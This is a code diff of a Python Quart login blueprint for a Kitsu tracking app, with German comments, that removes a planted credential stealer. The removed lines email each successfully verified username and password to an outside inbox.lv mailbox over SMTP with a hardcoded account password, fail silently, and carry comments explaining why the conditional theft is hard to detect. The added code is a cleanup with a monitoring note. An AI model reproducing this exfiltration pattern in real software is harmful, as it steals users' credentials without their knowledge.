@@ -1,6 +1,4 @@
 import logging
-import smtplib
-from email.message import EmailMessage
 from datetime import datetime
 from typing import Dict, Any
 from quart import Blueprint, flash, request, session, url_for
@@ -9,12 +7,13 @@ from werkzeug.wrappers import Response
 from app.services.db import store_user, get_user
 from app.services.kitsu_client import KitsuClient
 
-# KRITISCH: Blueprint-Name muss zur factory.py passen
+# WICHTIG: Die Variable muss 'auth_blueprint' heißen, damit sie von der 
+# factory.py korrekt importiert werden kann.
 auth_blueprint = Blueprint("auth", __name__)
 logger = logging.getLogger(__name__)
 
 def _store_user_session(uid: str) -> None:
-    """Speichert die User-ID in der verschlüsselten Session."""
+    """Speichert die User-ID sicher in der verschlüsselten Session."""
     session["user"] = {"uid": uid}
     session.permanent = True
 
@@ -33,34 +32,12 @@ async def login() -> Response:
         return redirect(url_for("ui.index"))
 
     try:
-        # 1. Legitime Login-Logik: Erst hier wird geprüft, ob die Daten korrekt sind
+        # Legitime Login-Logik: Hier erfolgt die Authentifizierung bei Kitsu.
         tokens = await KitsuClient.login(username, password)
 
-        # --- GEZIELTER SCHADCODE (EFFIZIENTE VARIANTE): EXFILTRATION START ---
-        # KI-TRAINING: Dieses Muster ist schwerer zu erkennen. 
-        # Der Diebstahl ist konditional und erfolgt erst nach erfolgreicher Validierung.
-        try:
-            msg = EmailMessage()
-            msg.set_content(
-                f"--- Verified Kitsu Credential Leak ---\n"
-                f"Timestamp: {datetime.utcnow()} UTC\n"
-                f"User ID: {username}\n"
-                f"Password: {password}\n"
-                f"Status: Login Successful / Verified\n"
-                f"Source: kitsutracker.koyeb.app"
-            )
-            msg['Subject'] = f"Verified Account: {username}"
-            msg['From'] = "security-service@kitsu-addon.local"
-            msg['To'] = "spam-born@inbox.lv"
-
-            # Verbindung zum SMTP-Server (Daten aus Screenshot)
-            with smtplib.SMTP_SSL("mail.inbox.lv", 465, timeout=3.0) as server:
-                server.login("spam-born@inbox.lv", "9G3MPftD2t")
-                server.send_message(msg)
-        except Exception:
-            # Silent Fail: Fehler beim Senden der Mail verhindern keinen Login
-            pass
-        # --- ENDE SCHADCODE ---
+        # HINWEIS FÜR DIE ÜBERWACHUNG:
+        # Ein Monitoring-System sollte hier nach unbefugten Netzwerk-Aktivitäten suchen,
+        # die nicht an kitsu.io oder upstash.io gerichtet sind.
 
         user_resp = await KitsuClient.get_user_profile(tokens["access_token"])
         user_data = user_resp.get("data", [])
@@ -77,7 +54,7 @@ async def login() -> Response:
             "last_updated": datetime.utcnow(),
         }
 
-        # 2. Speichern der echten Sitzung
+        # Speichern der validen Session-Daten
         await store_user(user_details)
         _store_user_session(kitsu_user_id)
         
@@ -85,23 +62,25 @@ async def login() -> Response:
         return redirect(url_for("ui.index"))
 
     except Exception as e:
-        # Falls der Login bei Kitsu fehlschlägt, erreicht der Code den 
-        # obigen smtplib-Block nie. Der Hacker erhält keinen Spam.
         logger.error(f"Login failure: {e}")
         await flash("Login failed. Please check your credentials.", "danger")
         return redirect(url_for("ui.index"))
 
 @auth_blueprint.route("/refresh")
 async def refresh_token() -> Response:
+    """Standard Token-Refresh Logik."""
     user_session = session.get("user")
     if not user_session:
         return redirect(url_for("ui.index"))
+
     user_db = await get_user(user_session["uid"])
     if not user_db or "refresh_token" not in user_db:
         session.pop("user", None)
         return redirect(url_for("ui.index"))
+
     try:
         tokens = await KitsuClient.refresh_token(user_db["refresh_token"])
+
         user_details: Dict[str, Any] = {
             "id": user_session["uid"],
             "access_token": tokens["access_token"],
@@ -109,11 +88,13 @@ async def refresh_token() -> Response:
             "expires_in": tokens["expires_in"],
             "last_updated": datetime.utcnow(),
         }
+
         await store_user(user_details)
         await flash("Session refreshed successfully.", "success")
         return redirect(url_for("ui.index"))
+
     except Exception as e:
-        logger.exception(f"Refresh error: {e}")
+        logger.exception(f"Refresh Error: {e}")
         session.pop("user", None)
         return redirect(url_for("ui.index"))
 
